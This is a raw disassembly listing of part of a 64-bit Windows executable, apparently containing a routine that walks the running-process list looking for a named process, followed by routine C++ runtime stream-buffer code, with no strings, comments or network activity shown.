   140004b4e:	77 17                	ja     0x140004b67
   140004b50:	e8 0b 53 00 00       	call   0x140009e60
   140004b55:	48 81 c4 c0 02 00 00 	add    $0x2c0,%rsp
   140004b5c:	5b                   	pop    %rbx
   140004b5d:	c3                   	ret
   140004b5e:	ff 15 14 b5 02 00    	call   *0x2b514(%rip)        # 0x140030078
   140004b64:	90                   	nop
   140004b65:	eb b0                	jmp    0x140004b17
   140004b67:	e8 b4 02 01 00       	call   0x140014e20
   140004b6c:	90                   	nop
   140004b6d:	e8 ae 02 01 00       	call   0x140014e20
   140004b72:	90                   	nop
   140004b73:	e8 a8 02 01 00       	call   0x140014e20
   140004b78:	cc                   	int3
   140004b79:	cc                   	int3
   140004b7a:	cc                   	int3
   140004b7b:	cc                   	int3
   140004b7c:	cc                   	int3
   140004b7d:	cc                   	int3
   140004b7e:	cc                   	int3
   140004b7f:	cc                   	int3
   140004b80:	40 53                	rex push %rbx
   140004b82:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   140004b89:	e8 12 fe ff ff       	call   0x1400049a0
   140004b8e:	33 d2                	xor    %edx,%edx
   140004b90:	8d 4a 02             	lea    0x2(%rdx),%ecx
   140004b93:	ff 15 b7 b4 02 00    	call   *0x2b4b7(%rip)        # 0x140030050
   140004b99:	48 8b d8             	mov    %rax,%rbx
   140004b9c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004ba0:	74 5e                	je     0x140004c00
   140004ba2:	33 d2                	xor    %edx,%edx
   140004ba4:	48 8d 4c 24 24       	lea    0x24(%rsp),%rcx
   140004ba9:	41 b8 34 02 00 00    	mov    $0x234,%r8d
   140004baf:	e8 dc 77 00 00       	call   0x14000c390
   140004bb4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004bb9:	c7 44 24 20 38 02 00 	movl   $0x238,0x20(%rsp)
   140004bc0:	00 
   140004bc1:	48 8b cb             	mov    %rbx,%rcx
   140004bc4:	ff 15 1e b5 02 00    	call   *0x2b51e(%rip)        # 0x1400300e8
   140004bca:	85 c0                	test   %eax,%eax
   140004bcc:	74 29                	je     0x140004bf7
   140004bce:	66 90                	xchg   %ax,%ax
   140004bd0:	48 8d 15 19 b0 03 00 	lea    0x3b019(%rip),%rdx        # 0x14003fbf0
   140004bd7:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140004bdc:	e8 6f e2 00 00       	call   0x140012e50
   140004be1:	48 8b cb             	mov    %rbx,%rcx
   140004be4:	85 c0                	test   %eax,%eax
   140004be6:	74 25                	je     0x140004c0d
   140004be8:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004bed:	ff 15 6d b4 02 00    	call   *0x2b46d(%rip)        # 0x140030060
   140004bf3:	85 c0                	test   %eax,%eax
   140004bf5:	75 d9                	jne    0x140004bd0
   140004bf7:	48 8b cb             	mov    %rbx,%rcx
   140004bfa:	ff 15 78 b4 02 00    	call   *0x2b478(%rip)        # 0x140030078
   140004c00:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140004c07:	5b                   	pop    %rbx
   140004c08:	e9 03 f5 ff ff       	jmp    0x140004110
   140004c0d:	ff 15 65 b4 02 00    	call   *0x2b465(%rip)        # 0x140030078
   140004c13:	e8 e8 d9 ff ff       	call   0x140002600
   140004c18:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140004c1f:	5b                   	pop    %rbx
   140004c20:	e9 eb f4 ff ff       	jmp    0x140004110
   140004c25:	cc                   	int3
   140004c26:	cc                   	int3
   140004c27:	cc                   	int3
   140004c28:	cc                   	int3
   140004c29:	cc                   	int3
   140004c2a:	cc                   	int3
   140004c2b:	cc                   	int3
   140004c2c:	cc                   	int3
   140004c2d:	cc                   	int3
   140004c2e:	cc                   	int3
   140004c2f:	cc                   	int3
   140004c30:	48 83 ec 28          	sub    $0x28,%rsp
   140004c34:	e8 47 ff ff ff       	call   0x140004b80
   140004c39:	33 c0                	xor    %eax,%eax
   140004c3b:	48 83 c4 28          	add    $0x28,%rsp
   140004c3f:	c3                   	ret
   140004c40:	40 53                	rex push %rbx
   140004c42:	48 83 ec 20          	sub    $0x20,%rsp
   140004c46:	48 8b d9             	mov    %rcx,%rbx
   140004c49:	48 8b 09             	mov    (%rcx),%rcx
   140004c4c:	48 85 c9             	test   %rcx,%rcx
   140004c4f:	74 4a                	je     0x140004c9b
   140004c51:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140004c55:	e8 d6 30 00 00       	call   0x140007d30
   140004c5a:	48 8b 0b             	mov    (%rbx),%rcx
   140004c5d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140004c61:	48 2b d1             	sub    %rcx,%rdx
   140004c64:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   140004c68:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004c6f:	72 18                	jb     0x140004c89
   140004c71:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140004c75:	48 83 c2 27          	add    $0x27,%rdx
   140004c79:	49 2b c8             	sub    %r8,%rcx
   140004c7c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140004c80:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004c84:	77 1b                	ja     0x140004ca1
   140004c86:	49 8b c8             	mov    %r8,%rcx
   140004c89:	e8 d2 51 00 00       	call   0x140009e60
   140004c8e:	33 c0                	xor    %eax,%eax
   140004c90:	48 89 03             	mov    %rax,(%rbx)
   140004c93:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004c97:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004c9b:	48 83 c4 20          	add    $0x20,%rsp
   140004c9f:	5b                   	pop    %rbx
   140004ca0:	c3                   	ret
   140004ca1:	e8 7a 01 01 00       	call   0x140014e20
   140004ca6:	cc                   	int3
   140004ca7:	cc                   	int3
   140004ca8:	cc                   	int3
   140004ca9:	cc                   	int3
   140004caa:	cc                   	int3
   140004cab:	cc                   	int3
   140004cac:	cc                   	int3
   140004cad:	cc                   	int3
   140004cae:	cc                   	int3
   140004caf:	cc                   	int3
   140004cb0:	40 53                	rex push %rbx
   140004cb2:	48 83 ec 20          	sub    $0x20,%rsp
   140004cb6:	48 8b d9             	mov    %rcx,%rbx
   140004cb9:	48 8b ca             	mov    %rdx,%rcx
   140004cbc:	e8 4f 29 00 00       	call   0x140007610
   140004cc1:	48 8b d0             	mov    %rax,%rdx
   140004cc4:	48 8b cb             	mov    %rbx,%rcx
   140004cc7:	48 83 c4 20          	add    $0x20,%rsp
   140004ccb:	5b                   	pop    %rbx
   140004ccc:	e9 4f 15 00 00       	jmp    0x140006220
   140004cd1:	cc                   	int3
   140004cd2:	cc                   	int3
   140004cd3:	cc                   	int3
   140004cd4:	cc                   	int3
   140004cd5:	cc                   	int3
   140004cd6:	cc                   	int3
   140004cd7:	cc                   	int3
   140004cd8:	cc                   	int3
   140004cd9:	cc                   	int3
   140004cda:	cc                   	int3
   140004cdb:	cc                   	int3
   140004cdc:	cc                   	int3
   140004cdd:	cc                   	int3
   140004cde:	cc                   	int3
   140004cdf:	cc                   	int3
   140004ce0:	40 53                	rex push %rbx
   140004ce2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ce6:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004ced:	00 
   140004cee:	48 8b d9             	mov    %rcx,%rbx
   140004cf1:	74 2c                	je     0x140004d1f
   140004cf3:	4c 8b 01             	mov    (%rcx),%r8
   140004cf6:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140004cfb:	41 ff 50 18          	call   *0x18(%r8)
   140004cff:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004d02:	74 1b                	je     0x140004d1f
   140004d04:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004d0b:	e8 34 e6 00 00       	call   0x140013344
   140004d10:	85 c0                	test   %eax,%eax
   140004d12:	79 0b                	jns    0x140004d1f
   140004d14:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004d19:	48 83 c4 20          	add    $0x20,%rsp
   140004d1d:	5b                   	pop    %rbx
   140004d1e:	c3                   	ret
   140004d1f:	33 c0                	xor    %eax,%eax
   140004d21:	48 83 c4 20          	add    $0x20,%rsp
   140004d25:	5b                   	pop    %rbx
   140004d26:	c3                   	ret
   140004d27:	cc                   	int3
   140004d28:	cc                   	int3
   140004d29:	cc                   	int3
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	cc                   	int3
   140004d2d:	cc                   	int3
   140004d2e:	cc                   	int3
   140004d2f:	cc                   	int3
   140004d30:	40 53                	rex push %rbx
   140004d32:	48 83 ec 20          	sub    $0x20,%rsp
   140004d36:	4d 8b c8             	mov    %r8,%r9
   140004d39:	48 8b d9             	mov    %rcx,%rbx
   140004d3c:	48 85 d2             	test   %rdx,%rdx
   140004d3f:	75 0b                	jne    0x140004d4c
   140004d41:	4d 85 c0             	test   %r8,%r8
   140004d44:	75 06                	jne    0x140004d4c
   140004d46:	45 8d 41 04          	lea    0x4(%r9),%r8d
   140004d4a:	eb 03                	jmp    0x140004d4f
   140004d4c:	45 33 c0             	xor    %r8d,%r8d
   140004d4f:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004d56:	48 85 c9             	test   %rcx,%rcx
   140004d59:	74 25                	je     0x140004d80
   140004d5b:	e8 00 f3 00 00       	call   0x140014060
   140004d60:	85 c0                	test   %eax,%eax
   140004d62:	75 1c                	jne    0x140004d80
   140004d64:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140004d6b:	44 8d 40 01          	lea    0x1(%rax),%r8d
   140004d6f:	48 8b cb             	mov    %rbx,%rcx
   140004d72:	e8 f9 15 00 00       	call   0x140006370
   140004d77:	48 8b c3             	mov    %rbx,%rax
   140004d7a:	48 83 c4 20          	add    $0x20,%rsp
   140004d7e:	5b                   	pop    %rbx
   140004d7f:	c3                   	ret
   140004d80:	33 c0                	xor    %eax,%eax
   140004d82:	48 83 c4 20          	add    $0x20,%rsp
   140004d86:	5b                   	pop    %rbx
   140004d87:	c3                   	ret
   140004d88:	cc                   	int3
   140004d89:	cc                   	int3
   140004d8a:	cc                   	int3
   140004d8b:	cc                   	int3
   140004d8c:	cc                   	int3
   140004d8d:	cc                   	int3
   140004d8e:	cc                   	int3
   140004d8f:	cc                   	int3
   140004d90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004d95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004d9a:	57                   	push   %rdi
   140004d9b:	48 83 ec 20          	sub    $0x20,%rsp
   140004d9f:	49 8b 40 08          	mov    0x8(%r8),%rax
   140004da3:	49 8b f0             	mov    %r8,%rsi
   140004da6:	49 03 00             	add    (%r8),%rax
   140004da9:	48 8b da             	mov    %rdx,%rbx
   140004dac:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004db3:	00 
   140004db4:	48 8b f9             	mov    %rcx,%rdi
   140004db7:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004dbc:	74 7e                	je     0x140004e3c
   140004dbe:	e8 dd 14 00 00       	call   0x1400062a0
   140004dc3:	84 c0                	test   %al,%al
   140004dc5:	74 75                	je     0x140004e3c
   140004dc7:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140004dce:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004dd3:	e8 bc f5 00 00       	call   0x140014394
   140004dd8:	85 c0                	test   %eax,%eax
   140004dda:	75 60                	jne    0x140004e3c
   140004ddc:	4c 8b 47 18          	mov    0x18(%rdi),%r8
   140004de0:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140004de4:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140004de8:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   140004dec:	49 39 00             	cmp    %rax,(%r8)
   140004def:	75 24                	jne    0x140004e15
   140004df1:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   140004df8:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   140004dff:	49 89 08             	mov    %rcx,(%r8)
   140004e02:	2b d1                	sub    %ecx,%edx
   140004e04:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140004e08:	48 89 08             	mov    %rcx,(%rax)
   140004e0b:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140004e0f:	89 10                	mov    %edx,(%rax)
   140004e11:	48 8b 4f 74          	mov    0x74(%rdi),%rcx
   140004e15:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140004e1a:	48 89 03             	mov    %rax,(%rbx)
   140004e1d:	48 8b c3             	mov    %rbx,%rax
   140004e20:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140004e27:	00 
   140004e28:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140004e2c:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004e31:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004e36:	48 83 c4 20          	add    $0x20,%rsp
   140004e3a:	5f                   	pop    %rdi
   140004e3b:	c3                   	ret
   140004e3c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004e41:	33 c0                	xor    %eax,%eax
   140004e43:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140004e4a:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140004e51:	00 
   140004e52:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004e56:	48 8b c3             	mov    %rbx,%rax
   140004e59:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004e5e:	48 83 c4 20          	add    $0x20,%rsp
   140004e62:	5f                   	pop    %rdi
   140004e63:	c3                   	ret
   140004e64:	cc                   	int3
   140004e65:	cc                   	int3
   140004e66:	cc                   	int3
   140004e67:	cc                   	int3
   140004e68:	cc                   	int3
   140004e69:	cc                   	int3
   140004e6a:	cc                   	int3
   140004e6b:	cc                   	int3
   140004e6c:	cc                   	int3
   140004e6d:	cc                   	int3
   140004e6e:	cc                   	int3
   140004e6f:	cc                   	int3
   140004e70:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004e75:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140004e7a:	56                   	push   %rsi
   140004e7b:	57                   	push   %rdi
   140004e7c:	41 56                	push   %r14
   140004e7e:	48 83 ec 20          	sub    $0x20,%rsp
   140004e82:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140004e86:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140004e8a:	41 8b e9             	mov    %r9d,%ebp
   140004e8d:	49 8b f0             	mov    %r8,%rsi
   140004e90:	48 8b fa             	mov    %rdx,%rdi
   140004e93:	48 8b d9             	mov    %rcx,%rbx
   140004e96:	4c 39 30             	cmp    %r14,(%rax)
   140004e99:	75 10                	jne    0x140004eab
   140004e9b:	41 83 f9 01          	cmp    $0x1,%r9d
   140004e9f:	75 0a                	jne    0x140004eab
   140004ea1:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140004ea6:	75 03                	jne    0x140004eab
   140004ea8:	48 ff ce             	dec    %rsi
   140004eab:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004eb2:	00 
   140004eb3:	74 75                	je     0x140004f2a
   140004eb5:	e8 e6 13 00 00       	call   0x1400062a0
   140004eba:	84 c0                	test   %al,%al
   140004ebc:	74 6c                	je     0x140004f2a
   140004ebe:	48 85 f6             	test   %rsi,%rsi
   140004ec1:	75 05                	jne    0x140004ec8
   140004ec3:	83 fd 01             	cmp    $0x1,%ebp
   140004ec6:	74 16                	je     0x140004ede
   140004ec8:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004ecf:	44 8b c5             	mov    %ebp,%r8d
   140004ed2:	48 8b d6             	mov    %rsi,%rdx
   140004ed5:	e8 6a fa 00 00       	call   0x140014944
   140004eda:	85 c0                	test   %eax,%eax
   140004edc:	75 4c                	jne    0x140004f2a
   140004ede:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004ee5:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004eea:	e8 fd ef 00 00       	call   0x140013eec
   140004eef:	85 c0                	test   %eax,%eax
   140004ef1:	75 37                	jne    0x140004f2a
   140004ef3:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004ef7:	4c 39 30             	cmp    %r14,(%rax)
   140004efa:	75 20                	jne    0x140004f1c
   140004efc:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140004f03:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140004f0a:	48 89 08             	mov    %rcx,(%rax)
   140004f0d:	2b d1                	sub    %ecx,%edx
   140004f0f:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004f13:	48 89 08             	mov    %rcx,(%rax)
   140004f16:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004f1a:	89 10                	mov    %edx,(%rax)
   140004f1c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004f21:	48 8b 43 74          	mov    0x74(%rbx),%rax
   140004f25:	48 89 0f             	mov    %rcx,(%rdi)
   140004f28:	eb 09                	jmp    0x140004f33
   140004f2a:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   140004f31:	33 c0                	xor    %eax,%eax
   140004f33:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140004f38:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140004f3d:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140004f44:	00 
   140004f45:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140004f49:	48 8b c7             	mov    %rdi,%rax
   140004f4c:	48 83 c4 20          	add    $0x20,%rsp
   140004f50:	41 5e                	pop    %r14
   140004f52:	5f                   	pop    %rdi
   140004f53:	5e                   	pop    %rsi
   140004f54:	c3                   	ret
   140004f55:	cc                   	int3
   140004f56:	cc                   	int3
   140004f57:	cc                   	int3
   140004f58:	cc                   	int3
   140004f59:	cc                   	int3
   140004f5a:	cc                   	int3
   140004f5b:	cc                   	int3
   140004f5c:	cc                   	int3
   140004f5d:	cc                   	int3
   140004f5e:	cc                   	int3
   140004f5f:	cc                   	int3
   140004f60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004f6a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004f6f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004f74:	41 56                	push   %r14
   140004f76:	48 83 ec 20          	sub    $0x20,%rsp
   140004f7a:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140004f7f:	4d 8b f0             	mov    %r8,%r14
   140004f82:	48 8b ea             	mov    %rdx,%rbp
   140004f85:	48 8b f9             	mov    %rcx,%rdi
   140004f88:	49 8b d8             	mov    %r8,%rbx
   140004f8b:	74 6d                	je     0x140004ffa
   140004f8d:	4d 85 c0             	test   %r8,%r8
   140004f90:	7e 60                	jle    0x140004ff2
   140004f92:	48 8b cf             	mov    %rdi,%rcx
   140004f95:	e8 96 15 00 00       	call   0x140006530
   140004f9a:	48 85 c0             	test   %rax,%rax
   140004f9d:	7e 31                	jle    0x140004fd0
   140004f9f:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   140004fa3:	48 3b d8             	cmp    %rax,%rbx
   140004fa6:	48 8b f3             	mov    %rbx,%rsi
   140004fa9:	48 8b d5             	mov    %rbp,%rdx
   140004fac:	48 0f 4d f0          	cmovge %rax,%rsi
   140004fb0:	4c 8b c6             	mov    %rsi,%r8
   140004fb3:	48 8b 09             	mov    (%rcx),%rcx
   140004fb6:	e8 25 6d 00 00       	call   0x14000bce0
   140004fbb:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140004fbf:	48 2b de             	sub    %rsi,%rbx
   140004fc2:	29 30                	sub    %esi,(%rax)
   140004fc4:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   140004fc8:	48 63 c6             	movslq %esi,%rax
   140004fcb:	48 01 01             	add    %rax,(%rcx)
   140004fce:	eb 1a                	jmp    0x140004fea
   140004fd0:	48 8b 07             	mov    (%rdi),%rax
   140004fd3:	48 8b cf             	mov    %rdi,%rcx
   140004fd6:	0f b6 55 00          	movzbl 0x0(%rbp),%edx
   140004fda:	ff 50 18             	call   *0x18(%rax)
   140004fdd:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004fe0:	74 10                	je     0x140004ff2
   140004fe2:	48 ff cb             	dec    %rbx
   140004fe5:	be 01 00 00 00       	mov    $0x1,%esi
   140004fea:	48 03 ee             	add    %rsi,%rbp
   140004fed:	48 85 db             	test   %rbx,%rbx
   140004ff0:	7f a0                	jg     0x140004f92
   140004ff2:	4c 2b f3             	sub    %rbx,%r14
   140004ff5:	49 8b c6             	mov    %r14,%rax
   140004ff8:	eb 74                	jmp    0x14000506e
   140004ffa:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140004ffe:	4c 8b 08             	mov    (%rax),%r9
   140005001:	4d 85 c9             	test   %r9,%r9
   140005004:	74 08                	je     0x14000500e
   140005006:	48 8b 41 58          	mov    0x58(%rcx),%rax
   14000500a:	8b 08                	mov    (%rax),%ecx
   14000500c:	eb 02                	jmp    0x140005010
   14000500e:	33 c9                	xor    %ecx,%ecx
   140005010:	48 63 f1             	movslq %ecx,%rsi
   140005013:	4d 85 f6             	test   %r14,%r14
   140005016:	7e 50                	jle    0x140005068
   140005018:	85 c9                	test   %ecx,%ecx
   14000501a:	7e 2d                	jle    0x140005049
   14000501c:	4c 3b f6             	cmp    %rsi,%r14
   14000501f:	49 8b c9             	mov    %r9,%rcx
   140005022:	49 0f 4c f6          	cmovl  %r14,%rsi
   140005026:	4c 8b c6             	mov    %rsi,%r8
   140005029:	e8 b2 6c 00 00       	call   0x14000bce0
   14000502e:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140005032:	4c 2b f6             	sub    %rsi,%r14
   140005035:	48 03 ee             	add    %rsi,%rbp
   140005038:	29 30                	sub    %esi,(%rax)
   14000503a:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   14000503e:	48 63 c6             	movslq %esi,%rax
   140005041:	48 01 01             	add    %rax,(%rcx)
   140005044:	4d 85 f6             	test   %r14,%r14
   140005047:	7e 1f                	jle    0x140005068
   140005049:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   140005050:	4d 85 c9             	test   %r9,%r9
   140005053:	74 13                	je     0x140005068
   140005055:	4d 8b c6             	mov    %r14,%r8
   140005058:	ba 01 00 00 00       	mov    $0x1,%edx
   14000505d:	48 8b cd             	mov    %rbp,%rcx
   140005060:	e8 e3 ed 00 00       	call   0x140013e48
   140005065:	4c 2b f0             	sub    %rax,%r14
   140005068:	49 2b de             	sub    %r14,%rbx
   14000506b:	48 8b c3             	mov    %rbx,%rax
   14000506e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005073:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005078:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000507d:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140005082:	48 83 c4 20          	add    $0x20,%rsp
   140005086:	41 5e                	pop    %r14
   140005088:	c3                   	ret
   140005089:	cc                   	int3
   14000508a:	cc                   	int3
   14000508b:	cc                   	int3
   14000508c:	cc                   	int3
   14000508d:	cc                   	int3
   14000508e:	cc                   	int3
   14000508f:	cc                   	int3
   140005090:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005095:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000509a:	41 56                	push   %r14
   14000509c:	48 83 ec 20          	sub    $0x20,%rsp
   1400050a0:	4d 8b f0             	mov    %r8,%r14
   1400050a3:	48 8b f2             	mov    %rdx,%rsi
   1400050a6:	48 8b d9             	mov    %rcx,%rbx
   1400050a9:	4d 85 c0             	test   %r8,%r8
   1400050ac:	7f 13                	jg     0x1400050c1
   1400050ae:	33 c0                	xor    %eax,%eax
   1400050b0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400050b5:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400050ba:	48 83 c4 20          	add    $0x20,%rsp
   1400050be:	41 5e                	pop    %r14
   1400050c0:	c3                   	ret
   1400050c1:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400050c6:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400050cb:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   1400050d0:	74 6a                	je     0x14000513c
   1400050d2:	49 8b fe             	mov    %r14,%rdi
   1400050d5:	48 8b cb             	mov    %rbx,%rcx
   1400050d8:	e8 73 14 00 00       	call   0x140006550
   1400050dd:	48 85 c0             	test   %rax,%rax
   1400050e0:	7e 31                	jle    0x140005113
   1400050e2:	48 8b 53 38          	mov    0x38(%rbx),%rdx
   1400050e6:	48 3b f8             	cmp    %rax,%rdi
   1400050e9:	48 8b ef             	mov    %rdi,%rbp
   1400050ec:	48 8b ce             	mov    %rsi,%rcx
   1400050ef:	48 0f 4d e8          	cmovge %rax,%rbp
   1400050f3:	4c 8b c5             	mov    %rbp,%r8
   1400050f6:	48 8b 12             	mov    (%rdx),%rdx
   1400050f9:	e8 e2 6b 00 00       	call   0x14000bce0
   1400050fe:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005102:	48 2b fd             	sub    %rbp,%rdi
   140005105:	29 28                	sub    %ebp,(%rax)
   140005107:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000510b:	48 63 c5             	movslq %ebp,%rax
   14000510e:	48 01 01             	add    %rax,(%rcx)
   140005111:	eb 1c                	jmp    0x14000512f
   140005113:	48 8b 03             	mov    (%rbx),%rax
   140005116:	48 8b cb             	mov    %rbx,%rcx
   140005119:	ff 50 38             	call   *0x38(%rax)
   14000511c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000511f:	0f 84 fa 00 00 00    	je     0x14000521f
   140005125:	88 06                	mov    %al,(%rsi)
   140005127:	48 ff cf             	dec    %rdi
   14000512a:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000512f:	48 03 f5             	add    %rbp,%rsi
   140005132:	48 85 ff             	test   %rdi,%rdi
   140005135:	7f 9e                	jg     0x1400050d5
   140005137:	e9 e3 00 00 00       	jmp    0x14000521f
   14000513c:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140005140:	49 8b ee             	mov    %r14,%rbp
   140005143:	48 8b 10             	mov    (%rax),%rdx
   140005146:	48 85 d2             	test   %rdx,%rdx
   140005149:	74 08                	je     0x140005153
   14000514b:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000514f:	8b 08                	mov    (%rax),%ecx
   140005151:	eb 02                	jmp    0x140005155
   140005153:	33 c9                	xor    %ecx,%ecx
   140005155:	48 63 c1             	movslq %ecx,%rax
   140005158:	85 c9                	test   %ecx,%ecx
   14000515a:	74 2b                	je     0x140005187
   14000515c:	49 3b c6             	cmp    %r14,%rax
   14000515f:	49 8b fe             	mov    %r14,%rdi
   140005162:	48 8b ce             	mov    %rsi,%rcx
   140005165:	48 0f 42 f8          	cmovb  %rax,%rdi
   140005169:	4c 8b c7             	mov    %rdi,%r8
   14000516c:	e8 6f 6b 00 00       	call   0x14000bce0
   140005171:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005175:	48 03 f7             	add    %rdi,%rsi
   140005178:	48 2b ef             	sub    %rdi,%rbp
   14000517b:	29 38                	sub    %edi,(%rax)
   14000517d:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140005181:	48 63 c7             	movslq %edi,%rax
   140005184:	48 01 01             	add    %rax,(%rcx)
   140005187:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   14000518e:	00 
   14000518f:	48 8b fd             	mov    %rbp,%rdi
   140005192:	0f 84 87 00 00 00    	je     0x14000521f
   140005198:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   14000519c:	48 8d 43 70          	lea    0x70(%rbx),%rax
   1400051a0:	49 39 00             	cmp    %rax,(%r8)
   1400051a3:	75 20                	jne    0x1400051c5
   1400051a5:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   1400051ac:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   1400051b3:	49 89 08             	mov    %rcx,(%r8)
   1400051b6:	2b d1                	sub    %ecx,%edx
   1400051b8:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400051bc:	48 89 08             	mov    %rcx,(%rax)
   1400051bf:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400051c3:	89 10                	mov    %edx,(%rax)
   1400051c5:	48 81 fd ff 0f 00 00 	cmp    $0xfff,%rbp
   1400051cc:	76 32                	jbe    0x140005200
   1400051ce:	66 90                	xchg   %ax,%ax
   1400051d0:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   1400051d7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400051dc:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   1400051e2:	48 8b ce             	mov    %rsi,%rcx
   1400051e5:	e8 42 f4 00 00       	call   0x14001462c
   1400051ea:	48 2b e8             	sub    %rax,%rbp
   1400051ed:	48 03 f0             	add    %rax,%rsi
   1400051f0:	48 8b fd             	mov    %rbp,%rdi
   1400051f3:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   1400051f9:	75 45                	jne    0x140005240
